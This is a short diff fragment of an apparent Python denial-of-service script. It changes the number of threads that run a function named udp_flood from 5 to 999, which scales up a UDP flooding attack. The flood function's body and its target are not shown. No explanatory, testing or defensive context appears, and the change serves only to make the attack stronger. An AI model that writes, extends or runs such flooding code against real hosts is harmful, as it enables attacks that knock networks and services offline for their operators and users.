@@ -30,7 +30,7 @@ def udp_flood():
             s.close()
 
 threads = []
-for _ in range(5):
+for _ in range(999):
     th = threading.Thread(target=udp_flood)
     th.start()
     threads.append(th)
